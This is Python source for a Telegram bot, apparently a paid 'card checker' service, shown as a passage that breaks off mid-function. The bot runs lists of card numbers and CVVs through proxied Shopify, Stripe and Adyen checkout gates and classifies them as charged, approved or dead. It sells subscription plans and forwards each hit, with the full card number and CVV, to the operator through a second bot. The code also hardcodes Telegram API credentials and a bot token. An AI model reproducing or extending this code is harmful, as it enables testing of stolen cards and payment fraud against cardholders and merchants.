PENDING_SITE_UPLOADS = {}
from telethon.tl.custom import Button
from telethon import TelegramClient, events, Button, Button
from telethon.errors import FloodWaitError
import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import json
import db_manager
import re
import zipfile
import io
from datetime import datetime, timedelta
from typing import Optional

API_ID = 36327505
API_HASH = 'b6d91e065b2e541c86a2ece75e901a53'
BOT_TOKEN = '8713237079:AAHwKLS31M4aLumNv0rpWTwHIeEMfgb01Tk'
ADMIN_FILE = 'admins.json'
try:
    with open(ADMIN_FILE, 'r') as f:
        ADMIN_ID = json.load(f)
except FileNotFoundError:
    ADMIN_ID = [8524951580, 6972539720]
    with open(ADMIN_FILE, 'w') as f:
        json.dump(ADMIN_ID, f)

API_SERVERS = [
    'https://asbroh-api-production-1f7e3.up.railway.app',
]


# ─── OFFICIAL GATE RESPONSE CLASSIFIER (AUGUST 2026 STANDARDS) ──────────────

def classify_gate_response(response_msg: str, raw_dict: dict = None, gateway: str = "") -> dict:
    """
    Standardized classification of gate responses across Shopify, Stripe, and Adyen (August 2026 Standards).
    Categories:
      - 'Charged': Successful transaction / Order created / Payment captured / Receipt issued
      - 'Approved': Live card verified (Insufficient funds, CVV mismatch, AVS mismatch, 3DS required)
      - 'Site Error': Bot/Store/API issue (Throttled, No product, Checkout failure) -> Needs site retry
      - 'Dead': Explicit card decline (Expired, Stolen, Do not honor, Invalid number, Fraudulent, etc.)
    """
    if raw_dict is None:
        raw_dict = {}
        
    # Check explicit API flags first
    if str(raw_dict.get('Charged', '')).lower() == 'true' or str(raw_dict.get('charged', '')).lower() == 'true':
        return {'status': 'Charged', 'retry': False}
    if str(raw_dict.get('Approved', '')).lower() == 'true' or str(raw_dict.get('approved', '')).lower() == 'true':
        return {'status': 'Approved', 'retry': False}
        
    msg = str(response_msg or "").strip()
    msg_upper = msg.upper()
    
    # ── 1. CHARGED (Order placed / Amount captured / Receipt generated) ──
    CHARGED_KEYWORDS = [
        'ORDER_PLACED', 'PAYMENT_COMPLETE', 'SUBMITSUCCESS', 'ORDER_CREATED',
        'PROCESSEDRECEIPT', 'PAYMENT SUCCESSFUL', 'SUCCEEDED', 'AUTHORISED',
        'PAYMENT ACCEPTED', 'THANK YOU FOR YOUR ORDER', 'THANK YOU', 'CHARGED',
        'SALE', 'RECEIPT', 'RECEIPT_ID', 'CONFIRMATION_NUMBER', 'ORDER_CONFIRMED',
        'TRANSACTION_COMPLETED', 'ORDER_STATUS_URL', 'ORDER_SUCCESS'
    ]
    if any(k in msg_upper for k in CHARGED_KEYWORDS):
        return {'status': 'Charged', 'retry': False}

    # ── 2. APPROVED (Card is 100% Live & Valid) ──
    # A) Insufficient Funds (Card is valid, no money)
    INSUFFICIENT_FUNDS_KEYWORDS = [
        'INSUFFICIENT_FUNDS', 'INSUFFICIENT FUNDS', 'NOT_ENOUGH_BALANCE',
        'NOT ENOUGH BALANCE', 'LOW_BALANCE', '140'
    ]
    # B) CVV / Security Code Mismatch (Card number + Expiry are LIVE)
    CVV_MISMATCH_KEYWORDS = [
        'INVALID_CVC', 'INCORRECT_CVC', 'CVC_DECLINED', 'CVV MISMATCH', 'CVV_MISMATCH',
        'SECURITY CODE', 'SECURITY_CODE', 'CVC CHECK FAILED', 'CVC_CHECK', 'INVALID_CVV',
        '103', '144'
    ]
    # C) 3D Secure / OTP Challenge (Card is alive, 3DS triggered)
    THREEDS_KEYWORDS = [
        '3DS_REQUIRED', '3D_SECURE', '3DS', 'AUTHENTICATION_REQUIRED',
        'ACTION_REQUIRED', 'REDIRECTSHOPPER', 'CHALLENGESHOPPER',
        'IDENTIFYSHOPPER', 'PRESENTTOSHOPPER', '128'
    ]
    # D) AVS / Postal code mismatch (Card is live)
    AVS_MISMATCH_KEYWORDS = [
        'INCORRECT_ZIP', 'ZIP_MISMATCH', 'AVS_FAILED', 'BILLING_ADDRESS_MISMATCH',
        'ADDRESS VERIFICATION FAILED', 'POSTAL_CODE_MISMATCH'
    ]
    # E) General Approval / Zero Auth
    APPROVED_KEYWORDS = [
        'APPROVED', 'APPROVE_WITH_ID', 'SUCCESS', 'ZERO AUTH', 'LIVE', 'CCN LIVE',
        'CARD_TESTING'
    ]
    
    if any(k in msg_upper for k in INSUFFICIENT_FUNDS_KEYWORDS):
        return {'status': 'Approved', 'retry': False}
    if any(k in msg_upper for k in CVV_MISMATCH_KEYWORDS):
        return {'status': 'Approved', 'retry': False}
    if any(k in msg_upper for k in THREEDS_KEYWORDS):
        return {'status': 'Approved', 'retry': False}
    if any(k in msg_upper for k in AVS_MISMATCH_KEYWORDS):
        return {'status': 'Approved', 'retry': False}
    if any(k in msg_upper for k in APPROVED_KEYWORDS) and not any(k in msg_upper for k in ['NOT APPROVED', 'UNAPPROVED', 'DECLINED']):
        return {'status': 'Approved', 'retry': False}

    # ── 3. SITE / INFRASTRUCTURE ERRORS (Requires Site Retry) ──
    SITE_ERROR_KEYWORDS = [
        'NO_PRODUCT', 'THROTTLED', 'TIMEOUT', 'TOKENIZATION_FAILED',
        'SITE_REQUIRES_LOGIN', 'CART_FAILED', 'CHECKOUT_FAILED',
        'NEGOTIATE_FAILED', 'GRAPHQL_ERROR', 'SESSION_EXPIRED',
        'NO_SESSION_TOKEN', 'NO_ATTEMPT_TOKEN', 'NO_SELLER_PROPOSAL',
        'CHECKPOINTDENIED', 'NO_SHOPIFY_PAYMENTS_GATEWAY', 'SUBMIT_FAILED',
        'ORDER_CREATION_FAILED', 'NO_PAYMENT_REQUIRED', 'PROXY ERROR',
        'CONNECTION REFUSED', 'HOST UNREACHABLE', 'INTERNAL_SERVER_ERROR',
        'GATEWAY_TIMEOUT', 'BAD_GATEWAY', 'CLOUDFLARE_BLOCKED',
        'MERCHANT_ACCOUNT_CLOSED', 'GATEWAY_NOT_CONFIGURED'
    ]
    if any(k in msg_upper for k in SITE_ERROR_KEYWORDS):
        return {'status': 'Site Error', 'retry': True}

    # ── 4. DEAD / DECLINED (Explicit Card Declines) ──
    return {'status': 'Dead', 'retry': False}

async def check_adyen_card(endpoint: str, card: str, proxy: Optional[str] = None) -> dict:
    """Check a single card on an Adyen gate via Railway API."""
    proxy_str = await get_formatted_proxy(proxy) if proxy else ""
    url = f"{ADYEN_API_URL}/{endpoint}"
    params = {
        "cc": card,
        "key": ADYEN_API_KEY,
    }
    if proxy_str:
        params["proxy"] = proxy_str
    
    timeout = aiohttp.ClientTimeout(total=45)
    async with aiohttp.ClientSession(timeout=timeout) as session:
        async with session.get(url, params=params) as resp:
            if resp.status != 200:
                error_text = await resp.text()
                return {"error": f"HTTP {resp.status}: {error_text[:200]}"}
            return await resp.json()

async def check_adyen_card_with_retry(card: str, gateway_key: str = "ady1", proxies: list = None, max_retries: int = 3) -> dict:
    """Adyen version of check_card_with_retry."""
    gate_info = ADYEN_GATE_MAP.get(gateway_key, ADYEN_GATE_MAP.get("ady1", {"endpoint": "ccn2", "name": "Adyen/CCN1"}))
    endpoint = gate_info["endpoint"]
    gate_name = gate_info["name"]

    if not proxies:
        proxies = await load_proxies()
    if not proxies:
        return {'status': 'Dead', 'message': 'No proxies available', 'card': card, 'gateway': gate_name, 'price': '$0.00', 'price_value': 0.0, 'psp': 'N/A', 'time': '0s'}
    
    for attempt in range(max_retries):
        proxy = random.choice(proxies)
        result_raw = await check_adyen_card(endpoint, card, proxy)
        
        if result_raw.get("error"):
            if attempt < max_retries - 1:
                await asyncio.sleep(0.5 * (attempt + 1))
                continue
            return {'status': 'Site Error', 'message': result_raw["error"], 'card': card, 'retry': True, 'gateway': gate_name, 'price': '$0.00', 'price_value': 0.0, 'psp': 'N/A', 'time': '0s'}
        resp_msg = result_raw.get("Response", "")
        classification = classify_gate_response(resp_msg, result_raw, gateway=gate_name)
        status = classification['status']
        
        price_val = result_raw.get("Price", "0.00")
        price_display = f"${price_val}" if not str(price_val).startswith("$") else str(price_val)
        
        return {
            'status': status,
            'message': resp_msg,
            'card': result_raw.get("CC", card),
            'gateway': result_raw.get("Gate", gate_name),
            'price': price_display,
            'price_value': 0.0,
            'psp': result_raw.get("PSP", "N/A"),
            'time': result_raw.get("Time", "0s"),
            'retry': False,
        }
    
    return {'status': 'Site Error', 'message': 'Max retries exceeded', 'card': card, 'retry': True, 'gateway': gate_name, 'price': '$0.00', 'price_value': 0.0, 'psp': 'N/A', 'time': '0s'}


ACTIVE_API_SERVERS = API_SERVERS.copy()
DEAD_API_SERVERS = set()

CHECKER_API_KEY = "AnonShopii2026!"

SITES_FILE = 'sites.txt'
PROXY_FILE = 'proxy.txt'
HITS_CHANNEL_ID = 0

bot = TelegramClient('ghost_bot', API_ID,
                     API_HASH).start(bot_token=BOT_TOKEN)

bot.loop.run_until_complete(db_manager.auto_migrate())

active_sessions = {}
active_user_checks = set()
user_cooldowns = {}
TEMP_FILE_DATA = {}
SHOPIFY_SESSION_RESULTS = {}
COLLECT_DATA = {}
PLANS = {
    'junior': {
        'name': 'Weekly Plan (Junior)',
        'price': '$3',
        'days': 7,
        'cards_per_file': 2000,
        'cooldown': 5
    },
    'pro': {
        'name': '2 Weeks Plan (Pro)',
        'price': '$5',
        'days': 14,
        'cards_per_file': 3500,
        'cooldown': 2
    },
    'premium': {
        'name': '1 Month Plan (Premium)',
        'price': '$9',
        'days': 30,
        'cards_per_file': 5000,
        'cooldown': 0
    }
}

async def check_cooldown(event, user_id):
    if await db_manager.is_banned(user_id):
        await event.reply(premium_emoji("❌ Yᴏᴜ ᴀʀᴇ ʙᴀɴɴᴇᴅ ғʀᴏᴍ ᴜsɪɴɢ ᴛʜɪs ʙᴏᴛ."), parse_mode='html')
        return False
        
    if user_id in ADMIN_ID:
        return True
    
    # Get user plan
    stats = await db_manager.get_user_stats(user_id)
    plan_key = stats.get('plan', 'junior')
    plan_config = PLANS.get(plan_key, PLANS['junior'])
    seconds = plan_config['cooldown']
    
    if seconds == 0:
        return True
        
    last_used = user_cooldowns.get(user_id, 0)
    now = time.time()
    if now - last_used < seconds:
        await event.reply(premium_emoji(f"⏳ Pʟᴇᴀsᴇ ᴡᴀɪᴛ {int(seconds - (now - last_used))} sᴇᴄᴏɴᴅs ʙᴇᴛᴡᴇᴇɴ ᴄᴏᴍᴍᴀɴᴅs.\n\n💡 <i>Tɪᴘ: Uᴘɢʀᴀᴅᴇ ʏᴏᴜʀ ᴘʟᴀɴ ᴛᴏ ʀᴇᴅᴜᴄᴇ ᴏʀ ʀᴇᴍᴏᴠᴇ ᴄᴏᴏʟᴅᴏᴡɴs! (/buy)</i>"), parse_mode='html')
        return False
    user_cooldowns[user_id] = now
    return True

async def safe_reply(event, text, **kwargs):
    """Safely reply to an event with floodwait retry and fallback."""
    try:
        return await event.reply(premium_emoji(text), **kwargs)
    except FloodWaitError as e:
        if e.seconds <= 3:
            await asyncio.sleep(e.seconds + 0.2)
            try:
                return await event.reply(premium_emoji(text), **kwargs)
            except Exception:
                pass
        try:
            chat_id = getattr(event, 'chat_id', None) or getattr(event, 'sender_id', None)
            if chat_id:
                return await bot.send_message(chat_id, premium_emoji(text), **kwargs)
        except Exception:
            pass
    except Exception:
        try:
            chat_id = getattr(event, 'chat_id', None) or getattr(event, 'sender_id', None)
            if chat_id:
                return await bot.send_message(chat_id, premium_emoji(text), **kwargs)
        except Exception:
            pass
    return None

async def safe_send(target, text, **kwargs):
    try:
        return await bot.send_message(target, premium_emoji(text), **kwargs)
    except FloodWaitError as e:
        if e.seconds <= 2:
            await asyncio.sleep(e.seconds)
            try:
                return await bot.send_message(target, premium_emoji(text), **kwargs)
            except Exception:
                pass
    except Exception:
        pass
    return None

async def safe_edit(target, text, **kwargs):
    """Safely edit a message. If FloodWaitError or failure occurs, fallback to reply/send immediately without stalling."""
    try:
        if hasattr(target, 'edit'):
            return await target.edit(premium_emoji(text), **kwargs)
        elif hasattr(target, 'edit_message'):
            return await target.edit_message(premium_emoji(text), **kwargs)
    except FloodWaitError as e:
        if e.seconds <= 2:
            await asyncio.sleep(e.seconds)
            try:
                if hasattr(target, 'edit'):
                    return await target.edit(premium_emoji(text), **kwargs)
            except Exception:
                pass
        # Fallback to sending reply or message
        try:
            if hasattr(target, 'reply'):
                return await target.reply(premium_emoji(text), **kwargs)
            elif hasattr(target, 'respond'):
                return await target.respond(premium_emoji(text), **kwargs)
            else:
                chat_id = getattr(target, 'chat_id', None)
                if chat_id:
                    return await bot.send_message(chat_id, premium_emoji(text), **kwargs)
        except Exception:
            pass
    except Exception:
        try:
            if hasattr(target, 'reply'):
                return await target.reply(premium_emoji(text), **kwargs)
            elif hasattr(target, 'respond'):
                return await target.respond(premium_emoji(text), **kwargs)
            else:
                chat_id = getattr(target, 'chat_id', None)
                if chat_id:
                    return await bot.send_message(chat_id, premium_emoji(text), **kwargs)
        except Exception:
            pass
    return None


COLLECT_TIMERS = {}
MERGE_DATA = {}
MERGE_TIMERS = {}

PREMIUM_EMOJI_IDS = {
    "✅": "5444987348334965906", "❌": "5447647474984449520", "🔥": "5116414868357907335",
    "⚡": "5219943216781995020", "💳": "5447453226498552490", "💠": "5870498447068502918",
    "📝": "5343649643685240676", "🌐": "5447602197439218445", "📊": "5445146408153806223",
    "📦": "5303102515301083665", "📋": "4904936030232117798", "⏳": "5258113901106580375",
    "🚀": "4904936030232117798", "⚠️": "4915853119839011973", "💎": "5343636681473935403",
    "👋": "5134476056241112076", "💡": "5301275719681190738", "📈": "5134457377428341766",
    "🔢": "5444931419270839381", "🔌": "5120722716260828125", "⭐️": "5172716095697584957",
    "🆓": "5406756500108501710", "👑": "6266995104687330978", "🔍": "5258396243666681152",
    "⏱️": "5343927661213279013", "💥": "5122933683820430249", "🆔": "5447311106030726740",
    "👤": "5445174334031166029", "📅": "5343927661213279013", "🔄": "5454245266305604993",
    "🏦": "5445408306669582934", "🥰": "5444931419270839381", "😱": "5447181973544008180",
    "🔷": "5258024802010026053", "🔑": "5454386656628991407", "📆": "5343927661213279013",
    "👥": "5454371323595744068", "🥕": "5447653032672129347", "➡️": "5445350109862720603",
    "🦉": "5123344136665039833", "🍑": "5445408306669582934", "💪": "5305622454218024328",
    "🌝": "5341684837881235158", "📁": "5444908424015934570", "ℹ️": "5289930378885214069",
    "💀": "5231338559587257737", "📢": "5116445341150872576", "💰": "5116648080787112958",
    "🔘": "5219901967916084166", "🔗": "5447479640547428304", "👇": "5122933683820430249",
    "📌": "5447187153274567373", "🍳": "5305622454218024328", "💸": "5283232570660634549",
    "🎉": "5172632227871196306", "🎁": "5283031441637148958",
    "🚫": "5116151848855667552",
    "🛒": "5447319442562251569", "🔧": "4904936030232117798",
    "⛔️": "5275969776668134187", "🥲": "4904468402782864209",
    "☠️": "5231338559587257737", "🛡": "5219672809936006424",
    "📸": "5445344161333015312", "💬": "5447510826304959724",
    "😺": "5118590136149345664", "🌍": "5303440357428586778",
    "🔹": "5429436388447655367", "📹": "5445158077579952110",
    "📡": "5447448489149625830", "🌟": "5310224206732996002",
    "📍": "5447187153274567373", "🔐": "5258476306152038031",
    "😇": "6321225560789877992", "👌": "5445350109862720603",
    "⭐": "6267298050205553492", "🍭": "6267152480878990865",
    "⚙️": "5258023599419171861", "⛔": "4918014360267260850",
    "📥": "5350747347724810871", "💵": "5350711759625795085",
    "️🏷️": "5436285465420383204",
    "📂": "5444908424015934570", "🛠️": "5348239232852836489",
    "📄️": "5323538339062628165",


}


FLAGS = {
    'AD': '🇦🇩', 'AE': '🇦🇪', 'AF': '🇦🇫', 'AG': '🇦🇬', 'AI': '🇦🇮',
    'AL': '🇦🇱', 'AM': '🇦🇲', 'AO': '🇦🇴', 'AQ': '🇦🇶', 'AR': '🇦🇷',
    'AS': '🇦🇸', 'AT': '🇦🇹', 'AU': '🇦🇺', 'AW': '🇦🇼', 'AX': '🇦🇽',
    'AZ': '🇦🇿', 'BA': '🇧🇦', 'BB': '🇧🇧', 'BD': '🇧🇩', 'BE': '🇧🇪',
    'BF': '🇧🇫', 'BG': '🇧🇬', 'BH': '🇧🇭', 'BI': '🇧🇮', 'BJ': '🇧🇯',
    'BL': '🇧🇱', 'BM': '🇧🇲', 'BN': '🇧🇳', 'BO': '🇧🇴', 'BQ': '🇧🇶',
    'BR': '🇧🇷', 'BS': '🇧🇸', 'BT': '🇧🇹', 'BV': '🇧🇻', 'BW': '🇧🇼',
    'BY': '🇧🇾', 'BZ': '🇧🇿', 'CA': '🇨🇦', 'CC': '🇨🇨', 'CD': '🇨🇩',
    'CF': '🇨🇫', 'CG': '🇨🇬', 'CH': '🇨🇭', 'CI': '🇨🇮', 'CK': '🇨🇰',
    'CL': '🇨🇱', 'CM': '🇨🇲', 'CN': '🇨🇳', 'CO': '🇨🇴', 'CR': '🇨🇷',
    'CU': '🇨🇺', 'CV': '🇨🇻', 'CW': '🇨🇼', 'CX': '🇨🇽', 'CY': '🇨🇾',
    'CZ': '🇨🇿', 'DE': '🇩🇪', 'DJ': '🇩🇯', 'DK': '🇩🇰', 'DM': '🇩🇲',
    'DO': '🇩🇴', 'DZ': '🇩🇿', 'EC': '🇪🇨', 'EE': '🇪🇪', 'EG': '🇪🇬',
    'EH': '🇪🇭', 'ER': '🇪🇷', 'ES': '🇪🇸', 'ET': '🇪🇹', 'FI': '🇫🇮',
    'FJ': '🇫🇯', 'FK': '🇫🇰', 'FM': '🇫🇲', 'FO': '🇫🇴', 'FR': '🇫🇷',
    'GA': '🇬🇦', 'GB': '🇬🇧', 'GD': '🇬🇩', 'GE': '🇬🇪', 'GF': '🇬🇫',
    'GG': '🇬🇬', 'GH': '🇬🇭', 'GI': '🇬🇮', 'GL': '🇬🇱', 'GM': '🇬🇲',
    'GN': '🇬🇳', 'GP': '🇬🇵', 'GQ': '🇬🇶', 'GR': '🇬🇷', 'GS': '🇬🇸',
    'GT': '🇬🇹', 'GU': '🇬🇺', 'GW': '🇬🇼', 'GY': '🇬🇾', 'HK': '🇭🇰',
    'HM': '🇭🇲', 'HN': '🇭🇳', 'HR': '🇭🇷', 'HT': '🇭🇹', 'HU': '🇭🇺',
    'ID': '🇮🇩', 'IE': '🇮🇪', 'IL': '🇮🇱', 'IM': '🇮🇲', 'IN': '🇮🇳',
    'IO': '🇮🇴', 'IQ': '🇮🇶', 'IR': '🇮🇷', 'IS': '🇮🇸', 'IT': '🇮🇹',
    'JE': '🇯🇪', 'JM': '🇯🇲', 'JO': '🇯🇴', 'JP': '🇯🇵', 'KE': '🇰🇪',
    'KG': '🇰🇬', 'KH': '🇰🇭', 'KI': '🇰🇮', 'KM': '🇰🇲', 'KN': '🇰🇳',
    'KP': '🇰🇵', 'KR': '🇰🇷', 'KW': '🇰🇼', 'KY': '🇰🇾', 'KZ': '🇰🇿',
    'LA': '🇱🇦', 'LB': '🇱🇧', 'LC': '🇱🇨', 'LI': '🇱🇮', 'LK': '🇱🇰',
    'LR': '🇱🇷', 'LS': '🇱🇸', 'LT': '🇱🇹', 'LU': '🇱🇺', 'LV': '🇱🇻',
    'LY': '🇱🇾', 'MA': '🇲🇦', 'MC': '🇲🇨', 'MD': '🇲🇩', 'ME': '🇲🇪',
    'MF': '🇲🇫', 'MG': '🇲🇬', 'MH': '🇲🇭', 'MK': '🇲🇰', 'ML': '🇲🇱',
    'MM': '🇲🇲', 'MN': '🇲🇳', 'MO': '🇲🇴', 'MP': '🇲🇵', 'MQ': '🇲🇶',
    'MR': '🇲🇷', 'MS': '🇲🇸', 'MT': '🇲🇹', 'MU': '🇲🇺', 'MV': '🇲🇻',
    'MW': '🇲🇼', 'MX': '🇲🇽', 'MY': '🇲🇾', 'MZ': '🇲🇿', 'NA': '🇳🇦',
    'NC': '🇳🇨', 'NE': '🇳🇪', 'NF': '🇳🇫', 'NG': '🇳🇬', 'NI': '🇳🇮',
    'NL': '🇳🇱', 'NO': '🇳🇴', 'NP': '🇳🇵', 'NR': '🇳🇷', 'NU': '🇳🇺',
    'NZ': '🇳🇿', 'OM': '🇴🇲', 'PA': '🇵🇦', 'PE': '🇵🇪', 'PF': '🇵🇫',
    'PG': '🇵🇬', 'PH': '🇵🇭', 'PK': '🇵🇰', 'PL': '🇵🇱', 'PM': '🇵🇲',
    'PN': '🇵🇳', 'PR': '🇵🇷', 'PS': '🇵🇸', 'PT': '🇵🇹', 'PW': '🇵🇼',
    'PY': '🇵🇾', 'QA': '🇶🇦', 'RE': '🇷🇪', 'RO': '🇷🇴', 'RS': '🇷🇸',
    'RU': '🇷🇺', 'RW': '🇷🇼', 'SA': '🇸🇦', 'SB': '🇸🇧', 'SC': '🇸🇨',
    'SD': '🇸🇩', 'SE': '🇸🇪', 'SG': '🇸🇬', 'SH': '🇸🇭', 'SI': '🇸🇮',
    'SJ': '🇸🇯', 'SK': '🇸🇰', 'SL': '🇸🇱', 'SM': '🇸🇲', 'SN': '🇸🇳',
    'SO': '🇸🇴', 'SR': '🇸🇷', 'SS': '🇸🇸', 'ST': '🇸🇹', 'SV': '🇸🇻',
    'SX': '🇸🇽', 'SY': '🇸🇾', 'SZ': '🇸🇿', 'TC': '🇹🇨', 'TD': '🇹🇩',
    'TF': '🇹🇫', 'TG': '🇹🇬', 'TH': '🇹🇭', 'TJ': '🇹🇯', 'TK': '🇹🇰',
    'TL': '🇹🇱', 'TM': '🇹🇲', 'TN': '🇹🇳', 'TO': '🇹🇴', 'TR': '🇹🇷',
    'TT': '🇹🇹', 'TV': '🇹🇻', 'TW': '🇹🇼', 'TZ': '🇹🇿', 'UA': '🇺🇦',
    'UG': '🇺🇬', 'UM': '🇺🇲', 'US': '🇺🇸', 'UY': '🇺🇾', 'UZ': '🇺🇿',
    'VA': '🇻🇦', 'VC': '🇻🇨', 'VE': '🇻🇪', 'VG': '🇻🇬', 'VI': '🇻🇮',
    'VN': '🇻🇳', 'VU': '🇻🇺', 'WF': '🇼🇫', 'WS': '🇼🇸', 'XK': '🇽🇰',
    'YE': '🇾🇪', 'YT': '🇾🇹', 'ZA': '🇿🇦', 'ZM': '🇿🇲', 'ZW': '🇿🇼'
}


def get_flag(code):
    return FLAGS.get(str(code).upper(), '◻️')


DEFAULT_FILTERS = [
    {"name": "0~10", "min": 0, "max": 10},
    {"name": "10~50", "min": 10, "max": 50},
    {"name": "50~200", "min": 50, "max": 200},
    {"name": "200~ & ", "min": 200, "max": 999999},
    {"name": "Aʟʟ Sɪᴛᴇs", "min": 0, "max": 999999, "all": True}
]


def premium_emoji(text: str) -> str:
    if not text:
        return text
    result = text
    for emoji, emoji_id in PREMIUM_EMOJI_IDS.items():
        result = result.replace(
            emoji, f'<tg-emoji emoji-id="{emoji_id}">{emoji}</tg-emoji>')
    return result


def get_main_menu_keyboard(user_id=None):
    buttons = [
        [Button.inline(" Cᴍᴅ", b"show_cmds", style="primary", icon=4904936030232117798),
         Button.inline(" Tᴏᴏʟs", b"tools_menu", style="primary", icon=5361734213370396027)],
        [Button.url(" Cʜᴀɴɴᴇʟ", "https://t.me/+_L8UIMAAFIBmOTgx",
                    style="success", icon=5445408306669582934)]
    ]
    if user_id and user_id in ADMIN_ID:
        buttons.append([Button.inline(" Aᴅᴍɪɴ Pᴀɴᴇʟ", b"admin_panel",
                       style="success", icon=6266995104687330978)])
    return buttons


async def get_file_lines(filepath):
    if not os.path.exists(filepath):
        return []
    try:
        async with aiofiles.open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
            return [line.strip() for line in content.splitlines() if line.strip()]
    except:
        return []


async def load_premium_users():
    return await db_manager.get_premium_users()


async def load_all_bot_users():
    return await db_manager.get_all_bot_users()


async def save_bot_user(user_id):
    await db_manager.save_bot_user(user_id)


async def load_sites(user_id=None):
    if user_id:
        user_sites = await db_manager.get_all_user_sites(user_id)
        if user_sites:
            return [item['url'] for item in user_sites]
    if user_id in ADMIN_ID or user_id is None:
        return await get_file_lines(SITES_FILE)
    return []


async def load_sites_with_price(user_id=None, min_price=0.0, max_price=30.0):
    if user_id:
        user_sites = await db_manager.get_user_sites(user_id, min_price, max_price)
        if user_sites:
            return user_sites
    if user_id in ADMIN_ID or user_id is None:
        global_sites = await db_manager.load_sites_with_price()
        if global_sites:
            return [s for s in global_sites if min_price <= s.get('price', 0.0) <= max_price]
    return []


async def load_proxies(user_id=None):
    if user_id:
        user_proxies = await db_manager.get_user_proxies(user_id)
        if user_proxies:
            return user_proxies
    if user_id in ADMIN_ID or user_id is None:
        return await get_file_lines(PROXY_FILE)
    return []


async def load_premium_expiry():
    pass


async def save_premium_expiry(data):
    pass



async def send_access_denied(event):
    msg = """❌ <b>Aᴄᴄᴇss Dᴇɴɪᴇᴅ</b>

Oɴʟʏ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀs ᴄᴀɴ ᴜsᴇ ᴛʜɪs ʙᴏᴛ."""
    buttons = [
        [Button.url("💬 Cᴏɴᴛᴀᴄᴛ Aᴅᴍɪɴ", "https://t.me/OwnerGhostHex", style="success", icon=5445408306669582934)]
    ]
    try:
        await event.reply(premium_emoji(msg), buttons=buttons, parse_mode='html')
    except:
        await event.reply(premium_emoji(msg), parse_mode='html')

async def is_premium(user_id):
    return await db_manager.is_premium_db(user_id, ADMIN_ID)


async def add_premium_user(user_id, expiry=None):
    await db_manager.add_premium_user(user_id, expiry)
    return True


async def remove_premium_user(user_id):
    await db_manager.remove_premium_user(user_id)
    return True


def generate_key():
    random_part = ''.join(random.choices(
        'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=15))
    return f"GHOST_{random_part}"


async def load_keys():
    return await db_manager.load_keys()


async def save_keys(keys):
    await db_manager.save_keys(keys)


async def load_price_filters():
    return await db_manager.load_price_filters()


async def save_price_filters(filters):
    await db_manager.save_price_filters(filters)


# load_sites_with_price is user-scoped above


async def save_sites_with_price(data):
    await db_manager.save_sites_with_price(data)


def get_price_from_response(raw_response):
    try:
        price = raw_response.get('Price', raw_response.get('price', '-'))
        if price != '-' and price != 0:
            try:
                price_clean = str(price).replace(
                    '$', '').replace(',', '').strip()
                return float(price_clean)
            except:
                return 0.0
        return 0.0
    except:
        return 0.0


DEAD_KEYWORDS_REGEX = re.compile(
    r'receipt id is empty|handle is empty|product id is empty|tax amount is empty|payment method identifier is empty|'
    r'invalid url|error in 1st req|error in 1 req|could not resolve|domain name not found|name or service not known|'
    r'site dead|captcha_required|captcha required|site not supported|invalid site|host not found|domain not found|'
    r'url rejected|malformed input|delivery_delivery_line_detail_changed|delivery_address2_required',
    re.IGNORECASE
)


def is_site_dead(response_msg, gateway, price):
    if not response_msg:
        return False
    return bool(DEAD_KEYWORDS_REGEX.search(response_msg))


async def get_bin_info(card_number):
    bin_number = str(card_number)[:6]
    
    cached = await db_manager.get_cached_bin(bin_number)
    if cached:
        return cached
        
    try:
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}') as res:
                if res.status != 200:
                    return '-', '-', '-', '-', '-', ''
                response_text = await res.text()
                try:
                    data = json.loads(response_text)
                    brand = data.get('brand', '-')
                    btype = data.get('type', '-')
                    level = data.get('level', '-')
                    bank = data.get('bank', '-')
                    country = data.get('country_name', '-')
                    flag = data.get('country_flag', '')
                    
                    await db_manager.cache_bin(bin_number, brand, btype, level, bank, country, flag)
                    
                    return brand, btype, level, bank, country, flag
                except:
                    return '-', '-', '-', '-', '-', ''
    except:
        return '-', '-', '-', '-', '-', ''


def extract_cc(text):
    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    matches = re.findall(pattern, text)
    cards = []
    for match in matches:
        card, month, year, cvv = match
        if len(year) == 2:
            year = '20' + year
        cards.append(f"{card}|{month}|{year}|{cvv}")
    return cards


async def send_hit_to_channel(card, status, response, gateway, price):
    if HITS_CHANNEL_ID == 0:
        return
    try:
        if "CHARGED" in status.upper() or "ORDER_PLACED" in status.upper():
            status_text = premium_emoji("💎 Cʜᴀʀɢᴇᴅ")
            should_pin = True
        elif "APPROVED" in status.upper():
            status_text = premium_emoji("✅ Aᴘᴘʀᴏᴠᴇᴅ")
            should_pin = False
        else:
            status_text = premium_emoji(f"📌 {status}")
            should_pin = False
        now = datetime.now()
        time_str = now.strftime("%H:%M:%S")
        msg = premium_emoji(f"""{status_text}
🛒 Gᴀᴛᴇᴡᴀʏ {gateway}
📝 {response[:45]}
⏱️ {time_str}
🍑 <a href='tg://user?id=8524951580 '>GHOST</a>""")
        sent_msg = await bot.send_message(abs(HITS_CHANNEL_ID), msg, parse_mode='html')
        if should_pin:
            try:
                await bot.pin_message(abs(HITS_CHANNEL_ID), sent_msg.id)
            except:
                pass
    except:
        pass


async def send_hit_to_admin(user_id, username, card, status, response, gateway, price):
    try:
        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])
        if "CHARGED" in status.upper() or "ORDER_PLACED" in status.upper():
            status_text = "💎 CHARGED"
        elif "APPROVED" in status.upper():
            status_text = "✅ APPROVED"
        else:
            status_text = f"📌 {status}"
        
        now = datetime.now()
        time_str = now.strftime("%H:%M:%S")
        
        message = f"""<b>{status_text} • ADMIN NOTIFICATION</b>

👤 <b>User:</b> @{username} (<code>{user_id}</code>)
⏰ <b>Time:</b> {time_str}

💳 <b>CC:</b> <code>{card}</code>

🛒 <b>Gateway:</b> {gateway}
📝 <b>Response:</b> {response[:150]}
💸 <b>Price:</b> {price}

🆔 <b>BIN Info:</b> {brand} - {bin_type} - {level}
🏦 <b>Bank:</b> {bank}
🥰 <b>Country:</b> {country} {flag}"""
        
        receivers = [ADMIN_HIT_RECEIVER_ID]
        url = f"https://api.telegram.org/bot{ADMIN_HIT_SENDER_TOKEN}/sendMessage"
        
        async with aiohttp.ClientSession() as session:
            for receiver in receivers:
                payload = {
                    "chat_id": receiver,
                    "text": message,
